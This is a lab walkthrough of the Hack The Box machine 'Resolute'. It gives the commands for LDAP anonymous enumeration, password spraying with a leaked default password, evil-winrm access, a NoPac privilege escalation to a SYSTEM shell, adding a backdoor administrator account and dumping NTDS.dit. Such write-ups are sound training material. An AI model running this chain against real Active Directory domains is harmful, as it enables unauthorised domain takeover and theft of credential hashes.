+++
tags = ["Box", "HTB", "Medium", "Windows", "LDAP", "Active", "Directory", "NoPac", "CVE-2021-42278", "CVE-2021-42287"]
draft = false
title = "Resolute HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-21
+++

## Resolute Hack The Box Walkthrough/Writeup: {#resolute-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Resolute>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 09:36:50 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:36 BST
          Nmap scan report for 10.129.96.155
          Host is up (0.040s latency).
          Not shown: 989 closed tcp ports (reset)
          PORT     STATE SERVICE
          53/tcp   open  domain
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl

          Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds

        ```
    -   **Initial thoughts**:
        -   All great enumeration vectors below:
            -   DNS
            -   Kerberos
            -   SMB
            -   LDAP

-   **In depth scan**:
    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/nmap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 09:37:03 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
          [sudo] password for kali:
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 09:38 BST
          Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
          SYN Stealth Scan Timing: About 75.76% done; ETC: 09:38 (0:00:09 remaining)
          Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
          SYN Stealth Scan Timing: About 75.95% done; ETC: 09:38 (0:00:09 remaining)
          Nmap scan report for 10.129.96.155
          Host is up (0.038s latency).
          Not shown: 65511 closed tcp ports (reset)
          PORT      STATE SERVICE      VERSION
          53/tcp    open  domain       Simple DNS Plus
          88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-20 08:45:53Z)
          135/tcp   open  msrpc        Microsoft Windows RPC
          139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
          389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
          445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
          464/tcp   open  kpasswd5?
          593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
          636/tcp   open  tcpwrapped
          3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
          3269/tcp  open  tcpwrapped
          5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          9389/tcp  open  mc-nmf       .NET Message Framing
          47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
          |_http-server-header: Microsoft-HTTPAPI/2.0
          |_http-title: Not Found
          49664/tcp open  msrpc        Microsoft Windows RPC
          49665/tcp open  msrpc        Microsoft Windows RPC
          49666/tcp open  msrpc        Microsoft Windows RPC
          49667/tcp open  msrpc        Microsoft Windows RPC
          49671/tcp open  msrpc        Microsoft Windows RPC
          49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
          49677/tcp open  msrpc        Microsoft Windows RPC
          49686/tcp open  msrpc        Microsoft Windows RPC
          49711/tcp open  msrpc        Microsoft Windows RPC
          49789/tcp open  unknown
          No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
          TCP/IP fingerprint:
          OS:SCAN(V=7.94SVN%E=4%D=10/20%OT=53%CT=1%CU=37772%PV=Y%DS=2%DC=I%G=Y%TM=671
          OS:4C1E3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S
          OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O
          OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
          OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
          OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
          OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
          OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
          OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
          OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
          OS:DFI=N%T=80%CD=Z)

          Network Distance: 2 hops
          Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

          Host script results:
          | smb-security-mode:
          |   account_used: <blank>
          |   authentication_level: user
          |   challenge_response: supported
          |_  message_signing: required
          | smb2-security-mode:
          |   3:1:1:
          |_    Message signing enabled and required
          | smb2-time:
          |   date: 2024-10-20T08:46:54
          |_  start_date: 2024-10-20T08:38:24
          |_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 6m59s
          | smb-os-discovery:
          |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
          |   Computer name: Resolute
          |   NetBIOS computer name: RESOLUTE\x00
          |   Domain name: megabank.local
          |   Forest name: megabank.local
          |   FQDN: Resolute.megabank.local
          |_  System time: 2024-10-20T01:46:55-07:00

          OS and Service detection performed. Please report any incorrect resu
        ```
    -   **Findings**:
        -   RPC is also running which is also to be expected.
        -   We have the domain name `megabank.local`


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 ldapchecker.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in 46.02-HTB/BlogEntriesMade/Resolute/scans/ldap  3GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 09:39:16 zsh ❯ python3 ~/Desktop/WindowsTools/ldapchecker.py $box
        Attempting to connect to 10.129.96.155 with SSL...
        Failed to connect with SSL.
        Attempting to connect to 10.129.96.155 with non-SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=megabank,DC=local
            CN=Configuration,DC=megabank,DC=local
            CN=Schema,CN=Configuration,DC=megabank,DC=local
            DC=DomainDnsZones,DC=megabank,DC=local
            DC=ForestDnsZones,DC=megabank,DC=local
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
            serverName:
                CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


#### LDAP Group Enumeration: {#ldap-group-enumeration}

-   **As my script auto enumerates this information: I check the file's**:
    -   `groupsLdap.txt`
    -   `groupsLdap_detailed.txt`

-   `groupsLdap.txt` **provides a simple list of group names, so we can check for interesting groups**:
    -   `cat groupsLdap.txt`

-   **Lets check for information in the description fields using** `groupsLdap_detailed.txt`:
    -   `cat groupsLdap_detailed.txt | grep -i -a Description -B 3`
    -   Nothing of note here

-   **Discoveries**:
    -   Nothing of note here


### Finding a hard-coded user password using LDAP User Enumeration: {#finding-a-hard-coded-user-password-using-ldap-user-enumeration}

-   **As my script auto enumerates this information: I check the file's**:
    -   `usersLdap.txt`
    -   `usersLdap_detailed.txt`

-   `usersLdap.txt` **provides a simple list of sam accounts present on the host that we can use for password spraying etc**:
    -   `cat usersLdap.txt`
    -   {{< figure src="/ox-hugo/2024-10-20-100827_.png" >}}

-   **Lets check for information in the description fields using** `usersLdap_detailed.txt`:
    -   `cat usersLdap_detailed.txt | grep -i Description -B 3`
    -   {{< figure src="/ox-hugo/2024-10-20-100901_.png" >}}
    -   boom, user password. We also now know this a default password so we can password spray with our user list incase any other users have left their passwords as the default value.


#### Password spraying all users with our found password: {#password-spraying-all-users-with-our-found-password}

-   **I password spray using the found password &amp; list of users &amp; get a hit for** `melanie`:
    -   {{< figure src="/ox-hugo/2024-10-20-102753_.png" >}}
    -   So this means taht the user `Marko` has changed theirs but `Melanie` has not.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   Find an entry for `ms02.megabank.local` on an internal ip. (they are all internal but you know what I mean.)
    -   {{< figure src="/ox-hugo/2024-10-20-103607_.png" >}}


### Kerberos `88`: {#kerberos-88}

-   Usually I would use [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames, however as we can query ldap directly we do not need to perform this.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-20-102212_.png" >}}
    -   Guest account is disabled and anonymous bind is also disabled.
    -   +Note+: The reason I am still checking for these is they would be findings in a real report.


#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

-   **I always try usernames as passwords as well**:
    -   `netexec smb $box -u Users.txt -p Users.txt --continue-on-success | grep [+]`
    -   No hits
    -   {{< figure src="/ox-hugo/2024-10-20-103439_.png" >}}


## 2. Foothold: {#2-dot-foothold}


### Enumerating the domain as melanie: {#enumerating-the-domain-as-melanie}

-   **I check if we have remote access using** `evil-winrm` **&amp; we do**:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-10-20-103938_.png" >}}

-   **Let's get our user flag**:
    -   {{< figure src="/ox-hugo/2024-10-20-104339_.png" >}}


### Strange LDAP Behavior: {#strange-ldap-behavior}

-   **I try to run a remote bloodhound collection but it fails, It appears there is something with our user account which won't enable it**:
    -   `python3 bloodhound.py -dc resolute.$domain -c All -u $user -p $user -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-10-20-105810_.png" >}}

-   **The same happens for** `asrep` **&amp;** `kerberoasting`:
    -   {{< figure src="/ox-hugo/2024-10-20-110123_.png" >}}


### I upload SharpChrome.exe via my evil-winrm for a session: {#i-upload-sharpchrome-dot-exe-via-my-evil-winrm-for-a-session}

-   **I get my collection**:
    -   {{< figure src="/ox-hugo/2024-10-20-110418_.png" >}}
    -   I think we may be on a second domain, as there are 2 domain mappings and we also so that other machine `MS02` earlier.

-   I look through the results but there are no immediate privesc paths apparent.


### Trying to load PowerView into memory: {#trying-to-load-powerview-into-memory}

-   **I upload** `PowerView.ps1` **using** `evil-winrm` **but when I try and execute it I get the below message**:
    -   `This script contains malicious content and has been blocked by your antivirus software.`
    -   {{< figure src="/ox-hugo/2024-10-20-144446_.png" >}}

-   I try various download cradles but these are all blocked:


### Using Winpeas to enumerate: {#using-winpeas-to-enumerate}

-   **I upload WinPeas and run it to look if there are any privesc paths that are obvious**:

-   Autologon creds:
    -   {{< figure src="/ox-hugo/2024-10-20-145802_.png" >}}


### Manual Enumeration of System Information: {#manual-enumeration-of-system-information}


#### Enumerating the password policy: {#enumerating-the-password-policy}

-   **Enumerating the password policy**:
    -   `net accounts`
    -   {{< figure src="/ox-hugo/2024-10-21-125847_.png" >}}
    -   We can spray without fear of lockout.


#### Enumerating the Windows Version: {#enumerating-the-windows-version}

-   **I enumerate the windows version**:
    -   `[System.Environment]::OSVersion.Version`
    -   {{< figure src="/ox-hugo/2024-10-20-151549_.png" >}}
    -   As you can see `systeminfo` was denied but we can still query the build using env.
    -   Checking this build number online we can see it's from version 1607:
        -   {{< figure src="/ox-hugo/2024-10-20-151739_.png" >}}
        -   <https://en.wikipedia.org/wiki/Windows_10_version_history>

-   I do also try and enumerate the patch/hotfix level but all efforts are blocked.


#### Enumerating Installed Applications: {#enumerating-installed-applications}

-   **I enumerate the installed applications by querying the registry**:
    ```powershell

    ('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*') | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation | sort-object -Property Displayname -Unique |Format-Table -AutoSize
    ```

    -   {{< figure src="/ox-hugo/2024-10-20-154742_.png" >}}
    -   Nothing of note:


#### Enumerating network services: {#enumerating-network-services}

-   **I check what network services are running internally but again nothing immediate pops out**:
    -   `netstat -nao`
    -   {{< figure src="/ox-hugo/2024-10-20-155736_.png" >}}
    -   +Note+:
        -   I have dialed in on loopback/localhost incase there is anything running internally.


#### Enumerate PATH: {#enumerate-path}

-   **Enumerating the** `PATH`:
    -   `$Env:PATH`
    -   {{< figure src="/ox-hugo/2024-10-20-155942_.png" >}}

-   **The path is standard for a Windows environment**: Here’s a breakdown:
    -   `C:\Windows\system32`: Primary system directory containing essential system files and executables.
    -   `C:\Windows`: The root directory for the Windows OS.
    -   `C:\Windows\System32\Wbem`: Contains files and tools for Windows Management Instrumentation (WMI).
    -   `C:\Windows\System32\WindowsPowerShell\v1.0\`: Path for PowerShell, used for executing scripts and commands.
    -   `C:\Users\melanie\AppData\Local\Microsoft\WindowsApps`: Path for user-specific Microsoft Store apps.


#### Enumerate ENV's: {#enumerate-env-s}

-   **I enumerate the** ~ENV~s **incase there is anything interesting**:
    -   `Get-ChildItem Env:`
    -   {{< figure src="/ox-hugo/2024-10-20-160001_.png" >}}


#### Enumerating Drives: {#enumerating-drives}

-   **Checking Drives**:
    -   `Get-PsDrive`
    -   {{< figure src="/ox-hugo/2024-10-20-160649_.png" >}}
    -   This is standard output:
        -   Virtual drives: Like `Alias, Cert, Env, Function, HKCU, HKLM, Variable`, and `WSMan` are virtual drives created by `PowerShell` to allow easy navigation and management of things like aliases, environment variables, and the registry.


#### Enumerating Scheduled Tasks: {#enumerating-scheduled-tasks}

-   **I try and enumerate scheduled tasks but I am denied**:
    -   {{< figure src="/ox-hugo/2024-10-20-161247_.png" >}}


### Manual Enumeration of users: {#manual-enumeration-of-users}


#### Query Privileges, Groups &amp; Logged in Users: {#query-privileges-groups-and-logged-in-users}

-   `whoami /priv /groups; query user; net user`
-   {{< figure src="/ox-hugo/2024-10-20-161842_.png" >}}
-   +Note+: The error below is because we are logged in with `evil-winrm` so it won't be seen as a live logged in session.
    -   {{< figure src="/ox-hugo/2024-10-20-161929_.png" >}}


### Manual Network Enumeration: {#manual-network-enumeration}


#### List all network interfaces, IP, and DNS: {#list-all-network-interfaces-ip-and-dns}

-   `ipconfig /all`
-   {{< figure src="/ox-hugo/2024-10-21-122404_.png" >}}


#### List the ARP table: {#list-the-arp-table}

-   `arp -A`
-   {{< figure src="/ox-hugo/2024-10-21-122538_.png" >}}


#### List current routing table: {#list-current-routing-table}

-   `route print`
-   {{< figure src="/ox-hugo/2024-10-21-122601_.png" >}}


### Manual Service/Program Enumeration: {#manual-service-program-enumeration}


#### Enumerating services using `evil-winrm`: {#enumerating-services-using-evil-winrm}

-   This will work often when other methods are denied:
    -   `services`
    -   {{< figure src="/ox-hugo/2024-10-21-122838_.png" >}}


#### Enumerating Binaries with Weak Service Permissions using `AccessChk` &amp; `SharpUp.exe`: {#enumerating-binaries-with-weak-service-permissions-using-accesschk-and-sharpup-dot-exe}

-   When using `accesschk`, we want to check our current user first because our current user will likely belong to most-if-not-all of those groups by default.
    -   This can help take the guess-work out of trying to find which group permissions were set on the service we are querying.
-   I upload the binary via `evil-winrm`

-   **I can the following commands to find any service that is writeable for our current user / any user**:
    -   `.\accesschk64.exe melanie -wuvc * -accepteula`
    -   `.\accesschk64.exe "Everyone" -wuvc * -accepteula`
    -   {{< figure src="/ox-hugo/2024-10-21-123651_.png" >}}
    -   Denied each time, let's try sharpup just incase.

-   **I upload** `SharpUp.exe` **and check for binaries with weak service permissions**:
    -   `.\SharpUP.exe audit`
    -   {{< figure src="/ox-hugo/2024-10-21-123811_.png" >}}
    -   As I expected denied.


#### Enumerate Startup Programs: {#enumerate-startup-programs}

-   **Enumerate Startup Programs**:
    -   `Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl`
    -   {{< figure src="/ox-hugo/2024-10-21-124944_.png" >}}
    -   Denied


### Session Enumeration: {#session-enumeration}

-   **I upload** [SessionGopher](https://github.com/Arvanaghi/SessionGopher) **&amp; check for any other existing sessions**:
    -   {{< figure src="/ox-hugo/2024-10-21-131442_.png" >}}
    -   There are none.


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Finding out the host is vulnerable to the `NoPac` vuln using netexec: {#finding-out-the-host-is-vulnerable-to-the-nopac-vuln-using-netexec}

-   **I attempt to use netexec to check if it's vulnerable**:
    -   `netexec smb $box -u $user -p $pass -M nopac`
    -   I get the error below.
    -   {{< figure src="/ox-hugo/2024-10-21-155436_.png" >}}

-   **Troubleshooting**
    -   Scrolling down I see the below.
    -   {{< figure src="/ox-hugo/2024-10-21-155548_.png" >}}
    -   **Error explained**:
        -   If you've encountered the error KerberosError: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` when using tools like netexec etc. It likely stems from a time synchronization issue between your system and the target you're trying to authenticate with.
        -   Kerberos relies heavily on timestamps as part of its secure authentication protocol, and even a small discrepancy in system time—typically more than five minutes—can cause the authentication process to fail.
        -   To resolve this issue, ensure both your machine and the target server are synced with the same accurate time source, such as using an NTP (Network Time Protocol) service.
            -   Which is what I will do now.

-   **I sync my clock with the host**:
    -   `sudo ntpdate -s resolute.$domain`

-   **I re-run my test using** `netexec` **to check if it's vulnerable**:
    -   `netexec smb $box -u $user -p $pass -M nopac`
    -   {{< figure src="/ox-hugo/2024-10-21-135004_.png" >}}
    -   This time we see it's vulnerable to the attack.

-   +Note+: I want to be really clear how I knew to test for this specific vulnerability. I have a document that I go through when checking for privilege escalation paths (see below). Simple as that, I keep a central document that I will go through for privesc and checks and then if none of them work I look to other sources.
    -   {{< figure src="/ox-hugo/2024-10-21-160020_.png" >}}
    -   I knew already that their was no `WSUS` vector as the service was not running &amp; neither was CA abuse as it was not running. There were no `AS-Reproastable` users, as show in bloodhound &amp; there were no users who had the correct perms for a `shadow credential` attack in bloodhound either.
    -   I'm telling you this as some walkthroughs make it seem like the attacker is a fountain of knowledge and has memorized all the latest attack vectors. Not the case, get a checklist and enumerate, that's it.

- +Deep Dive+ **I have created a deepdive into this particular exploit if you want to learn more**: 
  - https://bloodstiller.com/articles/understandingnopacexploit/

## 4. Ownership: {#4-dot-ownership}


### Preparing the NoPac Exploit: {#preparing-the-nopac-exploit}

-   **Clone NoPac Exploit Repo**:
    -   `git clone https://github.com/Ridter/noPac.git`

-   **Create Python Virtual Environment**:
    -   I prefer to use python venvs when using exploits this way I don't mess with my underlying python install and everything can existing in it's own space with it's own dependencies
    -   `cd noPac`
    -   `python3 -m venv noPac`

-   **Activate Venv**:
    -   `source noPac/bin/activate`

-   **Install Dependencies**:
    -   `pip3 install -r requirements`


### Using the NoPac exploit to get a shell on the victim: {#using-the-nopac-exploit-to-get-a-shell-on-the-victim}

-   **I run the exploit to get a shell on the host**:
    -   `sudo python3 noPac.py $domain/$user:$pass -dc-ip $box -dc-host resolute -shell --impersonate administrator -use-ldap`
    -   {{< figure src="/ox-hugo/2024-10-21-140916_.png" >}}
    -   As you can see it says `[!] Launching semi-interactive shell - Careful what you execute`. This means we need to get our root flag and set up some simple persistence.
        -   {{< figure src="/ox-hugo/2024-10-21-181723_.png" >}}

-   **I get the flag**:
    -   {{< figure src="/ox-hugo/2024-10-21-143235_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Adding a user as an administrator: {#adding-a-user-as-an-administrator}

-   **Add ourselves as a user**:
    -   As we have a limited &amp; unstable shell access the easiest thing to do is add ourselves to the host &amp; then as an administrator. This will then allow us to perform further persistence steps
        1.  **Add ourselves as a new user**:
            -   `net user bloodstiller bl00dst1ll3r! /add`
            -   {{< figure src="/ox-hugo/2024-10-21-143943_.png" >}}
        2.  **Add ourselves to the administrators group**:
            -   `net localgroup Administrators bloodstiller /add`
            -   {{< figure src="/ox-hugo/2024-10-21-143957_.png" >}}


### Dumping NTDS.dit: {#dumping-ntds-dot-dit}

-   **Dump** `NTDS.dit`:
    -   Now we have administrator access as our user we can dump the `NTDS.dit` using netexec:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-21-144113_.png" >}}

-   **Lets confirm the local adminstrator hash works**:
    -   {{< figure src="/ox-hugo/2024-10-21-144417_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  LDAP is the best. But really it can be used to get alot of valuable information.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Nothing terrible this time. Slow methodical manual enumeration was the way to solve this box.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


